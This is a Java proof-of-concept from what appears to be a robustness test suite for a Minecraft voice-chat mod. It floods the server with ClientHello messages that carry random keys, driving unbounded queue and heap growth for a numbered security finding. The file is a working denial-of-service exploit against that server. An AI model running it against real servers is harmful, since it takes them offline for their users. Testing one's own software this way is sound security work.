package com.enn3developer.gtnhvoice.robustness;

import java.security.SecureRandom;
import java.util.Random;

import com.enn3developer.gtnhvoice.network.HelloCodec;

/**
 * Finding #9 flood: after a real voice session is established, spam ClientHello (discriminator 0) on
 * the reliable {@code gtnhvoice} channel as fast as possible, each carrying a <b>fresh random 32-byte
 * X25519 public key</b>. A changed key forces {@code VoiceServerManager.handleClientHello} down the
 * session-rebuild path (ECDH + HKDF) and enqueues several tasks onto the unbounded, unthrottled
 * {@code pendingSends} queue, which the server tick drains only ~20x/sec. If the enqueue rate beats
 * the drain rate, the queue - and the server heap - grows without bound.
 *
 * <p>Client-side we can only see send throughput; the queue/heap must be watched server-side (jcmd).
 */
public final class PendingSendsGrowth {

    public static void main(String[] args) throws Exception {
        String host = args.length > 0 ? args[0] : "127.0.0.1";
        int port = args.length > 1 ? Integer.parseInt(args[1]) : 25565;
        String username = args.length > 2 ? args[2] : "mallory";
        int durationSec = args.length > 3 ? Integer.parseInt(args[3]) : 60;

        // Fresh pubkeys don't need to be cryptographically strong - just distinct enough to force the
        // rebuild path every iteration. A plain Random is faster than SecureRandom and keeps the client
        // send loop from being the bottleneck.
        Random rng = new Random(new SecureRandom().nextLong());

        System.out.println("[flood] establishing a real voice session first...");
        try (VoiceSession s = Client.connect(host, port)
            .username(username)
            .establish()) {

            System.out.println("[flood] session up (sessionId=" + s.getSessionId() + "); flooding ClientHello for "
                + durationSec + "s");

            long start = System.nanoTime();
            long deadline = start + durationSec * 1_000_000_000L;
            long sent = 0;
            long errors = 0;
            long lastReport = start;
            long lastReportSent = 0;

            byte[] pubkey = new byte[32];
            while (System.nanoTime() < deadline) {
                try {
                    rng.nextBytes(pubkey);
                    byte[] body = HelloCodec.encodeClientHello(Client.PROTOCOL_VERSION, "gtnhvoice-probe", pubkey);
                    s.sendControl(Client.DISC_CLIENT_HELLO, body);
                    sent++;
                } catch (Exception e) {
                    errors++;
                    if (errors <= 5) {
                        System.out.println("[flood] send error: " + e);
                    }
                }

                long now = System.nanoTime();
                if (now - lastReport >= 1_000_000_000L) {
                    long delta = sent - lastReportSent;
                    double secs = (now - lastReport) / 1e9;
                    System.out.printf("[flood] t=%2ds  sent=%d  rate=%.0f sends/sec  errors=%d%n",
                        (now - start) / 1_000_000_000L, sent, delta / secs, errors);
                    lastReport = now;
                    lastReportSent = sent;
                }
            }

            double total = (System.nanoTime() - start) / 1e9;
            System.out.printf("[flood] DONE: %d sends in %.1fs = %.0f sends/sec avg, errors=%d%n",
                sent, total, sent / total, errors);
        }
    }

    private PendingSendsGrowth() {}
}
